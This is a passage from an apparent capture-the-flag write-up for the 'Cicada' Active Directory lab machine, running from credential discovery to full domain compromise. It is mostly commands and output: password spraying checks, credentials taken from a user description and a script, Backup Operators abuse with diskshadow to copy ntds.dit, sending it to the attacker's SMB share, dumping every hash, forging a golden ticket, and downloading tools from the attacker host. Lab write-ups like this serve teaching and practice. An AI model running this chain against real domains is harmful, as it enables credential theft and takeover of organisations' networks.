├────────────┼───────────────────┼──────────────────────────┼──────────────────┤
│ cicada.htb │ krbtgt            │ n/a                      │ disabled         │
│ cicada.htb │ michael.wrightson │ Cicada$M6Corpb*@Lp#nZp!8 │ (probably valid) │
└────────────┴───────────────────┴──────────────────────────┴──────────────────┘
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cicada]
└─$ nxc smb $(pt get rhost) -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8'
SMB         10.129.206.45   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.206.45   445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
```


## Auth as david.orelious


### Enumeration for Active Directory


#### Gather data

- Ldeep

```bash
mkdir -p ldeep && ldeep ldap -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' -d $(pt get domain) -s ldap://$(pt get rhost) all ldeep/
```

- Bloodhound

```bash
bloodhound-python -d $(pt get domain) -ns $(pt get ip) -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' -c all --zip
```

#### Get insight

- No `kerberoastable` and `asreproastable` targets

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cicada]
└─$ cat ldeep/*_users_nokrbpreauth.json | jq .
cat ldeep/*_users_spn.json | jq .
[]
[]
```

- Group and its users
	- `emily.oscars` have `Remote Management Users` and `Backup Operators` groups, which means it can execute commands via **winrm** and perform privilege escalation

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cicada]
└─$ cat ldeep/*_users_all.json | jq 'map(select(.memberOf != null)) | reduce .[] as $item ({}; reduce $item.memberOf[] as $group (.; .[$group] = (.[$group] // []) + [$item.sAMAccountName]))'
{
  "CN=Remote Management Users,CN=Builtin,DC=cicada,DC=htb": [
    "emily.oscars"
  ],
  "CN=Backup Operators,CN=Builtin,DC=cicada,DC=htb": [
    "emily.oscars"
  ],
  "CN=Denied RODC Password Replication Group,OU=Group,DC=cicada,DC=htb": [
    "krbtgt"
  ],
  "CN=Guests,CN=Builtin,DC=cicada,DC=htb": [
    "Guest"
  ],
  "CN=Group Policy Creator Owners,OU=Group,DC=cicada,DC=htb": [
    "Administrator"
  ],
  "CN=Domain Admins,OU=Group,DC=cicada,DC=htb": [
    "Administrator"
  ],
  "CN=Enterprise Admins,OU=Group,DC=cicada,DC=htb": [
    "Administrator"
  ],
  "CN=Schema Admins,OU=Group,DC=cicada,DC=htb": [
    "Administrator"
  ],
  "CN=Administrators,CN=Builtin,DC=cicada,DC=htb": [
    "Administrator"
  ]
}
```

### Password in user description

Check for interesting attributes from **ldeep** result

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cicada]
└─$ cat ldeep/*_users_all.json | jq 'map(del(.accountExpires,.badPasswordTime,.badPwdCount,.c,.cn,.codePage,.company,.countryCode,.dSCorePropagationData,.distinguishedName,.dn,.givenName,.instanceType,.l,.lastLogoff,.lastLogon,.logonCount,.mail,.name,.objectCategory,.objectClass,.objectGUID,.objectSid,.postalCode,.primaryGroupID,.pwdLastSet,.sAMAccountType,.sn,.st,.streetAddress,.uSNChanged,.uSNCreated,.whenChanged,.whenCreated,.memberOf,.logonHours,.isCriticalSystemObject,.showInAdvancedViewOnly,.lockoutTime,.nTSecurityDescriptor,.initials)) | sort_by(.lastLogonTimestamp)'| sed -E -e 's/DONT_REQUIRE|servicePrincipalName|NOTREQD/\x1b[31m&\x1b[0m/ig' -e 's/DONT_EXPIRE/\x1b[33m&\x1b[0m/ig' -e 's/description/\x1b[34m&\x1b[0m/ig'
```

- Found a potential password for user `david.orelious`

![](/assets/obsidian/4e3c4c1725f19658c1002a43a78765ae.png)

- The password is valid

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cicada]
└─$ nxc smb $(pt get rhost) -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3'
SMB         10.129.206.45   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.206.45   445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3
```


## Shell as emily.oscars


### 445 - SMB : Credential in powershell script

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cicada]
└─$ nxc smb $(pt get rhost) -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' --shares
SMB         10.129.206.45   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.206.45   445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3
SMB         10.129.206.45   445    CICADA-DC        [*] Enumerated shares
SMB         10.129.206.45   445    CICADA-DC        Share           Permissions     Remark
SMB         10.129.206.45   445    CICADA-DC        -----           -----------     ------
SMB         10.129.206.45   445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.129.206.45   445    CICADA-DC        C$                              Default share
SMB         10.129.206.45   445    CICADA-DC        DEV             READ
SMB         10.129.206.45   445    CICADA-DC        HR              READ
SMB         10.129.206.45   445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.129.206.45   445    CICADA-DC        NETLOGON        READ            Logon server share
SMB         10.129.206.45   445    CICADA-DC        SYSVOL          READ            Logon server share
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cicada]
└─$ /home/kali/scripts/utils/dump_smb.sh $(pt get rhost) 'david.orelious' 'aRt$Lp#7t*VQ!3'
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cicada/loot/smb]
└─$ find . -type f -exec ls -latrh {} + 2>/dev/null
-rw-r--r-- 1 bravosec kali  601 Oct  2 07:13  ./DEV/Backup_script.ps1
-rw-r--r-- 1 bravosec kali 1.3K Oct  2 07:13 './HR/Notice from HR.txt'
[...]
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cicada/loot/smb]
└─$ cat DEV/Backup_script.ps1

$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```

- Credential is valid

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cicada]
└─$ nxc smb $(pt get rhost) -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
SMB         10.129.206.45   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.206.45   445    CICADA-DC        [+] cicada.htb\emily.oscars:Q!3@Lp#M6b*7t*Vt
```

### Evilwinrm

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cicada]
└─$ evil-winrm -i $(pt get rhost) -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> whoami
cicada\emily.oscars
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> cat ..\Desktop\user.txt
b8ce44c4a116b3e5c78d7e038dc2ba99
```


# Root Flag
---

## From emily.oscars to nt authority system


### Backup operator to domain admin

- `emily.oscars` have `Backup Operators` group and `SeBackupPrivilege` privilege, which allows to dump NTDS file then extract user hashes

```powershell
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> whoami /all

USER INFORMATION
----------------

User Name           SID
=================== =============================================
cicada\emily.oscars S-1-5-21-917908876-1423158569-3159038727-1601


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

> There's a more detailed info in my **Blackfield** writeup, this time I will just copy-paste the easier living-off-the-land method
{: .prompt-info }

> Refer - https://0xdf.gitlab.io/2020/10/03/htb-blackfield.html#grab-ntdsdit

Create vss scripts in order to execute commands in **diskshadow** without interactive shell

```bash
cat << EOF > vss.dsh
set context persistent nowriters
set metadata c:\programdata\df.cab
set verbose on
add volume c: alias df
create
expose %df% z:
EOF

cat << EOF > vss_clean.dsh
set context persistent nowriters
set metadata c:\programdata\df.cab
set verbose on
delete shadows volume df
reset
EOF
```

Convert the scripts to DOS format in order to work on Windows

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cicada]
└─$ unix2dos *.dsh
unix2dos: converting file vss_clean.dsh to DOS format...
unix2dos: converting file vss.dsh to DOS format...
```

Execute the scripts to make a shadow copy of `C:\` drive

```powershell
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> cd \programdata
*Evil-WinRM* PS C:\programdata> upload *.dsh

Info: Uploading /home/kali/htb/Cicada/*.dsh to C:\programdata

Info: Upload successful!

*Evil-WinRM* PS C:\programdata> diskshadow /s c:\programdata\vss.dsh
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  CICADA-DC,  10/1/2024 6:14:15 PM

-> set context persistent nowriters
-> set metadata c:\programdata\df.cab
-> set verbose on
-> add volume c: alias df
-> create

Alias df for shadow ID {6f09eabb-3030-418d-be8d-35a922f978f2} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {8d1237bb-5416-489a-8d02-34e60685cf4e} set as environment variable.
Inserted file Manifest.xml into .cab file df.cab
Inserted file DisF5AD.tmp into .cab file df.cab

Querying all shadow copies with the shadow copy set ID {8d1237bb-5416-489a-8d02-34e60685cf4e}

        * Shadow copy ID = {6f09eabb-3030-418d-be8d-35a922f978f2}               %df%
                - Shadow copy set: {8d1237bb-5416-489a-8d02-34e60685cf4e}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{fcebaf9b-0000-0000-0000-500600000000}\ [C:\]
                - Creation time: 10/1/2024 6:14:16 PM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - Originating machine: CICADA-DC.cicada.htb
                - Service machine: CICADA-DC.cicada.htb
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %df% z:
-> %df% = {6f09eabb-3030-418d-be8d-35a922f978f2}
The shadow copy was successfully exposed as z:\.
->
```

Extract `NTDS` file and `system` hive

```powershell
*Evil-WinRM* PS C:\programdata> robocopy /b z:\Windows\NTDS .\ntds ntds.dit
[...]
------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         1         0         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :   16.00 m   16.00 m         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00


   Speed :           107,546,256 Bytes/sec.
   Speed :             6,153.846 MegaBytes/min.
   Ended : Tuesday, October 1, 2024 6:37:29 PM
```

```powershell
*Evil-WinRM* PS C:\programdata> reg save HKLM\SYSTEM SYSTEM
The operation completed successfully.
```

Exfiltrate the files

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cicada]
└─$ mkdir -p smb && cd smb && smbserver.py -smb2support s . -username s -password s
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

```powershell
*Evil-WinRM* PS C:\programdata> net use \\10.10.14.81\s /user:s s
The command completed successfully.

*Evil-WinRM* PS C:\programdata> copy SYSTEM \\10.10.14.81\s; copy NTDS\ntds.dit \\10.10.14.81\s
```

Cleanup shadow copy and the leftover files

```powershell
*Evil-WinRM* PS C:\programdata> diskshadow /s c:\programdata\vss_clean.dsh
[...]
*Evil-WinRM* PS C:\programdata> rm -r -fo SYSTEM, ntds, *.dsh, df.cab
```

Extract hashes

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cicada/smb]
└─$ secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL -outputfile secretsdump
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: f954f575c626d6afe06c2b80cc2185e6
[*] Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
CICADA-DC$:1000:aad3b435b51404eeaad3b435b51404ee:188c2f3cb7592e18d1eae37991dee696:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3779000802a4bb402736bee52963f8ef:::
cicada.htb\john.smoulder:1104:aad3b435b51404eeaad3b435b51404ee:0d33a055d07e231ce088a91975f28dc4:::
cicada.htb\sarah.dantelia:1105:aad3b435b51404eeaad3b435b51404ee:d1c88b5c2ecc0e2679000c5c73baea20:::
cicada.htb\michael.wrightson:1106:aad3b435b51404eeaad3b435b51404ee:b222964c9f247e6b225ce9e7c4276776:::
cicada.htb\david.orelious:1108:aad3b435b51404eeaad3b435b51404ee:ef0bcbf3577b729dcfa6fbe1731d5a43:::
cicada.htb\emily.oscars:1601:aad3b435b51404eeaad3b435b51404ee:559048ab2d168a4edf8e033d43165ee5:::
[*] Kerberos keys from ntds.dit
Administrator:aes256-cts-hmac-sha1-96:e47fd7646fa8cf1836a79166f5775405834e2c060322d229bc93f26fb67d2be5
Administrator:aes128-cts-hmac-sha1-96:f51b243b116894bea389709127df1652
Administrator:des-cbc-md5:c8838c9b10c43b23
CICADA-DC$:aes256-cts-hmac-sha1-96:e9752f2c7752bd92142588e63dc0383499f49b04a46de37845e33d40de1db7ed
CICADA-DC$:aes128-cts-hmac-sha1-96:7fc8e7f2daa14d0ccdf070de9cfc49c5
CICADA-DC$:des-cbc-md5:b0f7cdec040d5b6d
krbtgt:aes256-cts-hmac-sha1-96:357f15dd4d315af47ac63658c444526ec0186f066ad9efb46906a7308b7c60c8
krbtgt:aes128-cts-hmac-sha1-96:39cbc0f220550c51fb89046ac652849e
krbtgt:des-cbc-md5:73b6c419b3b9bf7c
cicada.htb\john.smoulder:aes256-cts-hmac-sha1-96:57ae6faf294b7e6fbd0ce5121ac413d529ae5355535e20739a19b6fd2a204128
cicada.htb\john.smoulder:aes128-cts-hmac-sha1-96:8c0add65bd3c9ad2d1f458a719cfda81
cicada.htb\john.smoulder:des-cbc-md5:f1feaeb594b08575
cicada.htb\sarah.dantelia:aes256-cts-hmac-sha1-96:e25f0b9181f532a85310ba6093f24c1f2f10ee857a97fe18d716ec713fc47060
cicada.htb\sarah.dantelia:aes128-cts-hmac-sha1-96:2ac9a92bca49147a0530e5ce84ceee7d
cicada.htb\sarah.dantelia:des-cbc-md5:0b5b014370fdab67
cicada.htb\michael.wrightson:aes256-cts-hmac-sha1-96:d89ff79cc85032f27499425d47d3421df678eace01ce589eb128a6ffa0216f46
cicada.htb\michael.wrightson:aes128-cts-hmac-sha1-96:f1290a5c4e9d4ef2cd7ad470600124a9
cicada.htb\michael.wrightson:des-cbc-md5:eca8d532fd8f26bc
cicada.htb\david.orelious:aes256-cts-hmac-sha1-96:125726466d0431ed1441caafe8c0ed9ec0d10b0dbaf4fec7a184b764d8a36323
cicada.htb\david.orelious:aes128-cts-hmac-sha1-96:ce66c04e5fd902b15f5d4c611927c9c2
cicada.htb\david.orelious:des-cbc-md5:83585bc41573897f
cicada.htb\emily.oscars:aes256-cts-hmac-sha1-96:4abe28adc1d16373f4c8db4d9bfd34ea1928aca72cb69362d3d90f69d80c000f
cicada.htb\emily.oscars:aes128-cts-hmac-sha1-96:f98d74d70dfb68b70ddd821edcd6a023
cicada.htb\emily.oscars:des-cbc-md5:fd4a5497d38067cd
[*] Cleaning up...
```

Request a golden ticket (Kerberos is stealthier than NTLM authentication)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cicada/smb]
└─$ sudo ntpdate -u $(pt get rhost)
2024-10-02 09:56:30.167959 (+0800) +0.113178 +/- 0.139853 cicada.htb 10.129.223.26 s1 no-leap

┌──(bravosec㉿fsociety)-[~/htb/Cicada/smb]
└─$ export DOMAIN=$(pt get domain);export AESKEY=$(cat secretsdump.ntds.kerberos|grep krbtgt|head -n1|cut -d":" -f3); export DOMAINSID=$(lookupsid.py $domain/'Administrator'@$DOMAIN 1 -hashes '0:'$(cat secretsdump.ntds|grep Administrator|cut -d ":" -f 4)|tail -n1|cut -d ":" -f 2| xargs); ticketer.py -aesKey $AESKEY -domain-sid $DOMAINSID -domain $DOMAIN Administrator
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Creating basic skeleton ticket and PAC Infos
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
/usr/local/bin/ticketer.py:606: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  encRepPart['last-req'][0]['lr-value'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
[*]     EncAsRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncASRepPart
[*] Saving ticket in Administrator.ccache
```

Configure kerberos for **evil-winrm** to work

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cicada/smb]
└─$ sudo ~/scripts/ad/configure_krb5.py $(pt get domain) CICADA-DC
[*] Configuration Data:
[libdefault]
        default_realm = CICADA.HTB

[realms]
        CICADA.HTB = {
                kdc = cicada-dc.cicada.htb
                admin_server = cicada-dc.cicada.htb
        }

[domain_realm]
        cicada.htb = CICADA.HTB
        .cicada.htb = CICADA.HTB


[!] Above Configuration will overwrite /etc/krb5.conf, are you sure? [y/N] y
[+] /etc/krb5.conf has been configured
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cicada/smb]
└─$ export KRB5CCNAME=Administrator.ccache

┌──(bravosec㉿fsociety)-[~/htb/Cicada/smb]
└─$ evil-winrm -r cicada.htb -i CICADA-DC.cicada.htb

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
cicada.htb\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ..\Desktop\root.txt
0d3bb76812c47f6e61ece569eb292fa4
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

# Additional
---

## BackupOperator to domain admin (Alternatives)

> Reference - https://pentestlab.blog/2024/01/22/domain-escalation-backup-operator/

### 1 - BackupOperatorToolkit

> https://github.com/improsec/BackupOperatorToolkit

```bash
*Evil-WinRM* PS C:\programdata> (new-object System.Net.WebClient).DownloadFile('http://10.10.14.81/BackupOperatorToolkit.exe', '\programdata\BackupOperatorToolkit.exe')
*Evil-WinRM* PS C:\programdata> \programdata\BackupOperatorToolkit.exe DUMP C:\programdata\ \\cicada.htb
DUMP MODE
[+] Connecting to registry hive
[+] hive: SAM
[+] Dumping hive to C:\programdata\
[+] Connecting to registry hive
[+] hive: SYSTEM
[+] Dumping hive to C:\programdata\
[+] Connecting to registry hive
[+] hive: SECURITY
[+] Dumping hive to C:\programdata\
```

### 2 - RemoteRegSave

> https://github.com/snovvcrash/RemoteRegSave

```bash
*Evil-WinRM* PS C:\programdata> (new-object System.Net.WebClient).DownloadFile('http://10.10.14.81/RegSave.exe', '\programdata\RegSave.exe')
*Evil-WinRM* PS C:\programdata> \programdata\RegSave.exe -t CICADA-DC.cicada.htb -o C:\programdata\
[+] Exported \\CICADA-DC.cicada.htb\HKLM\SAM to C:\programdata\0A67394A-BBAE-4F22-87E1-86A982C67922
[+] Exported \\CICADA-DC.cicada.htb\HKLM\SYSTEM to C:\programdata\99981237-714F-4479-8265-5FDCA403FA98
[-] RegOpenKeyEx: 5
```